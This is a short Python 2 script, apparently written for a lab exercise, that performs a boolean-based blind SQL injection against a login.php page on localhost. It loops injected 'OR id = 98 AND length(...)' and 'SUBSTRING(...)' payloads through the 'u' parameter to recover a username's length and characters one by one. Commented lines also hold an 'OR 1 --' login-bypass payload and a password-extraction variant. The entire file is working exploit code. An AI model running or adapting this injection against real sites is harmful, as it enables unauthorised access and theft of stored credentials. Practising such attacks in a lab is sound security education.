import subprocess
import urllib
import string


# request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20" 
# request = "http://localhost/lab09/login.php?u=\"%20OR%201%20--%20 " 
#bashCommand = "echo 'hello' "
# subprocess.call(['wget','-q','-O','index.html',request])
#output, error = process.communicate()
#print output
#print error
#print bashCommand



################################# Loop to get field's size
size = 0;
for s in xrange(0,40):
	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(username)%20=%20" + str(s) + "--%20"
	f = urllib.urlopen(request)
	response = f.read()
	if (response.find('cat.JPG')!=-1): 
		print "found size : %s" %s
		size = s
		break

for pos in xrange(1,size+1):

	for c in xrange(0,128):
		request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(username,"+ str(pos) +",1)%20=%20%27" + chr(c) + "%27%20--%20" 
		f = urllib.urlopen(request)
		response = f.read()
		if (response.find('cat.JPG')!=-1): 
			print "found letter %s at position %d" %(chr(c),pos)
			break



# f = urllib.urlopen(request)
# print "1" + f.geturl()
# print "2" + f.read()